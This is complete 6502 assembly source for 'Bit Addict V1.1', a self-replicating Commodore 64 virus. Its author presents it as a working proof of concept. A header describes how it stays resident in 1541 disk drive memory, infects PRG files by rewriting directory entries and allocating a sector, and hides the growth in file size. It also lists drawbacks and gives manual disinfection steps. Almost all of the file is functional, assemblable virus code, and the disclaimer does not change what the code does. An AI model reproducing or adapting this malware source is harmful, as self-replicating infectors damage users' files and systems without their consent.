;===( Bit Addict V1.1 virus by Scan / House Designs )===
;
; Effective virus size: 249 bytes
; Virus size on disk: 1 block (256 bytes)
; Virus type: Semi-stealth resident parasitic prepender
; Compiler used: 64tass
;
; This is the first thing I've programmed for the C64 since 25 years, probably better optimization is possible.
; Also, this virus is a homage to a friend of mine, an amazing virus writer in the DOS era, who passed away in 2011.
; Why a virus? Well, I've written a lot of viruses for DOS back in the 90s (as John Tardy and later as Rajaat) and 
; lately I got interested in coding for the C64 again, so naturally this was the first thing I could think of.
;
; Description:
;   When an infected file is executed the virus receives control and copies the virus code to the memory in the disk
;   drive ($0404), so that the aligns with the layout of a sector (1st two bytes are a pointer to next sector, the
;   2nd two bytes are the loading offset for a program). Then it executes the main infection routine in the disk drive
;   memory while in the meantime the host is relocated to $0801 (thus programs with no basic stub will crash!) and
;   executed.
;
;   This part is executed from within the disk drive:
;       When receiving control it will read track  18 sector 1 to $0300 in the 1541 memory. It will then check for PRG 
;       files (file type #$82) and if found it will check if the #$18th byte of the directory entry is set to #$ff (the
;       infection marker). If the value of the entry is not #$00 it assumes the file already to be infected (avoids geos 
;       files).
;
;       If a candidate host is found it will allocate a free sector on the disk, it will change the starting track and
;       sector of the file in the directory entry to the newly allocated free sector, store the original starting track
;       and sector in the virus buffer (which is formatted to look like a sector, hence the shift to $0404 in offset)
;       and then write the virus to the allocated space.  The file size in the directory will not be updated, making the
;       virus semi-stealth (although the head movement is very noticable).
;   
;       After having tried finding a file to infect it goes into a loop, waiting for another disk to be inserted. If done,
;       the infection process will be repeated, but instead if a DOS command is executed, the virus gives up control and 
;       passes the call to the 1541 kernal, which never returns from the loop, thus disabling the virus.
;
; Drawbacks:
;   - .PRG files not loading to $801 will crash 
;   - To deactivate the virus in drive memory, just issue a DOS command
;   - Will only work with (emulated) 1541 drives
;   - It will infect only 1 program at a time and only checks the first 8 files
;   - No error handling for drive actions (ie. write-protect)
;
; Disinfection:
;   Use a disk editor, find the infected file (#$18th byte of an infected file in the directory is set to #$ff) and change 
;   the starting head/sector to the 2nd (located in the first sector). 
;   Optionally: Unallocate the virus sector in the BAM (not needed for disinfection)
;
; Disclaimer: Use at your own risk. And don't be an asshole and spread it to people that have no idea what's happening. This
;             is a working Proof of Concept. I have no desire to receive a lot of complaints of people that got accidentally
;             infected. Read the description well.
;             Other members of House Designs have no hand in the creation of this product, they are not reliable for any
;             damages that this virus may (hopefully may not) cause.
;
; References:
;   C64 ROM listing                                 http://unusedino.de/ec64/technical/misc/c64/romlisting.html
;   C64 Zeropage documentation                      https://www.c64-wiki.com/index.php/Zeropage
;   All_About_Your_1541-Online Help                 http://unusedino.de/ec64/technical/aay/c1541/
;   D64 (Electronic form of a physical 1541 disk)   http://unusedino.de/ec64/technical/formats/d64.html
;   A 256 Byte Autostart Fast Loader for the C64    http://www.pagetable.com/?p=568
;   Making a Virus Scanner                          http://codebase64.org/doku.php?id=base%3Aviruslist
;
;   ... and I had to use some sites with basic info about c64 opcodes, because I forgot a lot ;)
; 
AMOUNT          = 32                        ; amount of bytes to transfer to 1541 in chunks and space occupation by one directory entry
target          = $0400                     ; buffer #1 in 1541 diskdrive
offset          = $0404                     ; virus offset 1541 memory (first 2 bytes are reserved for next track/sector, 2nd for loading location)
host            = $08ff                     ; location of the host in c64 memory
; c64 zero page and kernal functions
current_device  = $ba   
cassette_buffer = $b2
send            = $eddd
send_listen     = $ed0c
send_listen_2nd = $edb9
unlisten        = $ffae
init_basic      = $a659
run_basic       = $a7ae
; 1541 disk drive zero page and kernal functions
disk_change     = $1c
attn_receive    = $7c
not_0_turn_off  = $c10c
init_drive      = $c63d
verify_drive    = $c3ca
write_bam       = $eef4
read_sector     = $d586
write_sector    = $d58a
block_alloc     = $f1a9 
motor_off       = $f98f
exec_command    = $e85b

*= $0801

virus           .word (+), 17480            ; basic stub (spells HD)
                .null $9e, ^repeat_command  ;
+               .word 0

; the command first because we change it (this way it is written to the drive before the change)
; from 'virus' up to 'cmd_exec' must be send to the 1541 memory first, because of self modifying code
cmd_write       .byte AMOUNT,>target,<target
                .text "W-M"

send_cmd        jsr il_device               ; write command to device 
l_send_cmd      lda cmd_write,x             ;
                jsr send                    ;
                dex                         ;
                bpl l_send_cmd              ;
                rts                         ;
                
cmd_exec        .byte >target,<entrypoint+3 ; offset of drive code to execute in 1541 memory
                .text "E-M"                 

; assembler entrypoint of virus                 
repeat_command  ldx #(send_cmd-cmd_write)-1 ; length of command
                jsr send_cmd
                tax                         ; X becomes #$20, the amount of bytes we need to send after sending M-W command
send_virus      lda virus-4,y               ; send part of the virus, 32 byte-chunks at a time
                jsr send
                iny
                dex
                bne send_virus
                jsr unlisten
                sty cmd_write+2             ; change the target offset (that's why it that part to be sent first)
                tya                     
                bne repeat_command
; execute the code in the drive RAM (the main working horse)
                ldx #(repeat_command-cmd_exec)-1
                lda #<cmd_exec              ; change send command to point to M-E command (that's why that part had to be sent first)
                sta l_send_cmd+1            ;
                jsr send_cmd
                jsr unlisten
                ldy #(<il_device-relocator)-1
move_relocator  lda relocator,y
                sta (cassette_buffer),y     ; usually $033c
                dey
                bpl move_relocator          ; Y becomes #$FF after this loop
                ldx #$c9                    ; amount of 256-byte chunks we want the relocator to transfer (+1, explained at relocator)
                dec $01                     ; disable ROM basic
                jmp (cassette_buffer)

; relocator to be used at $033c
relocator       lda host-$ff,y              ; dirty hack to save one byte (an 'iny' after moving the relocator 1st loop just moves 1 byte) 
                sta $0801-$ff,y             ;
cloop           iny
                bne relocator
                inc $033e                   ; = relocator+2
                inc $0341                   ; = relocator+5
                dex
                bne relocator
                inc $01                     ; enable ROM basic
                jsr init_basic
                jmp run_basic

; send listen command to current device             
il_device       lda current_device          ; send listen command to 1541 drive
                jsr send_listen
                lda #$6f                    ; secondary address set
                jmp send_listen_2nd         ; and implicit return to the call  

; part of the code executed in the disk drive
drive           lda #$f7                    ; erase LED bit
                and $1c00               
                jsr not_0_turn_off
                
wait            lda attn_receive            ;
                beq no_command
                jmp exec_command
no_command      lda disk_change             ; disk change?
                beq wait                    ; no, we wait 

entrypoint      jsr init_drive
                jsr verify_drive
                lda #18
                sta $06                     ; track for buffer #0
                stx $f9                     ; buffer #0 at $300 (directory entries)
                inx                         ; set loading address for virus ($0801)
                stx $07                     ; sector for buffer #0
                stx $0402                   ;
                lda #$08                    ;
                sta $0403                   ;
                jsr read_sector             ; X becomes #$00
scan_file       lda $0302,x
                cmp #$82                    ; is it a PRG file?
                beq is_prg                  ; yes, let's try to infect it if it hasn't already
is_infected     txa                         ; no? let's advance to next entry
                clc                         ;
                adc #AMOUNT                 ;
                tax                         ;
                bne scan_file               ;
                jsr motor_off               ; turn off motor
                bne drive                   ; never branches equal
                ;---
is_prg          lda $0318,x                 ; (byte #$18 of a directory entry)
                bne is_infected             ; if it's other than 00 skip it (infected already or geos file)
                dec $0318,x                 ; flag as infected
                lda $0303,x                 ; store original track and sector at virus sector in buffer #1
                sta $0400                   ;
                lda $0304,x                 ;
                sta $0401                   ;
                txa
                pha
                jsr block_alloc             ; find free sector and allocate it
                jsr write_bam               ; write to disk, Y becomes 0 (allocated track/sector in $80/$81)
                pla
                tax
                sty $f9                     ; buffer #0 at $300 (directory entries)
                lda $80                     ; change starting track and sector to new allocated sector in directory entry 
                sta $0303,x                 ;
                sta $08                     ; track for buffer #1
                lda $81                     ;
                sta $0304,x                 ;
                sta $09                     ; sector for buffer #1
                jsr write_sector            ; write directory track (buffer #0)
                inc $f9                     ; buffer #1 at $400 (virus)
                jsr write_sector
                bne drive                   ; never branches equal

                .text "HOUSE"
                
drive_end